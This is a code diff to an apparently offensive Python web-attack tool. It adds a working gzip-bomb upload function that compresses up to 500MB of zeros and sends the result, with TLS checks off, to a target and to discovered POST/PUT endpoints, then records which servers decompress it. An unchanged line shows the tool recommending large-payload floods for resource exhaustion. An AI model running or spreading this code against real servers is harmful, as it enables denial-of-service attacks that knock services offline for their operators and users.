@@ -1,6 +1,8 @@
 from __future__ import annotations
 
 import asyncio
+import gzip
+import io
 import json
 import statistics
 import time
@@ -366,5 +368,63 @@ async def test_large_payload(url: str, payload_size_kb: int = 1024, method: str 
         "recommendation": (
             f"Server accepts up to {max_accepted}KB — flood with large payloads for resource exhaustion"
             if max_accepted > 0 else "Server rejects large payloads"
+        ),
+    }
+
+
+async def gzip_bomb_upload(url: str, method: str = "POST", uncompressed_mb: int = 50) -> dict:
+    uncompressed_mb = min(uncompressed_mb, 500)
+    raw = bytes(uncompressed_mb * 1024 * 1024)
+    buf = io.BytesIO()
+    with gzip.GzipFile(fileobj=buf, mode="wb", compresslevel=9) as f:
+        f.write(raw)
+    compressed = buf.getvalue()
+    ratio = round(len(raw) / max(len(compressed), 1), 1)
+
+    endpoints = [url] + [
+        e.get("url", "") for e in STATE.discovered_endpoints
+        if e.get("method", "GET") in ("POST", "PUT") and e.get("url")
+    ][:5]
+
+    results = []
+    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=0, limit_per_host=0)) as session:
+        for ep in endpoints[:6]:
+            if not ep:
+                continue
+            try:
+                start = time.monotonic()
+                async with session.request(
+                    method, ep,
+                    data=compressed,
+                    headers={
+                        "Content-Encoding": "gzip",
+                        "Content-Type": "application/octet-stream",
+                    },
+                    ssl=False,
+                    timeout=aiohttp.ClientTimeout(total=20),
+                ) as r:
+                    elapsed = (time.monotonic() - start) * 1000
+                    STATE.total_requests_sent += 1
+                    accepted = r.status not in (400, 411, 413, 415, 422)
+                    results.append({
+                        "url": ep, "status": r.status,
+                        "response_ms": round(elapsed, 2),
+                        "server_decompressed": accepted,
+                    })
+            except Exception as e:
+                results.append({"url": ep, "error": str(e)})
+
+    accepted = [r for r in results if r.get("server_decompressed")]
+    return {
+        "attack_type": "gzip_bomb_upload",
+        "compressed_bytes": len(compressed),
+        "uncompressed_bytes": len(raw),
+        "amplification_ratio": ratio,
+        "results": results,
+        "endpoints_accepted": len(accepted),
+        "vulnerable": len(accepted) > 0,
+        "recommendation": (
+            f"{len(accepted)} endpoints accepted gzip body — server decompresses {uncompressed_mb}MB per {len(compressed)//1024}KB request"
+            if accepted else "No endpoints accepted Content-Encoding: gzip body"
         ),
     }
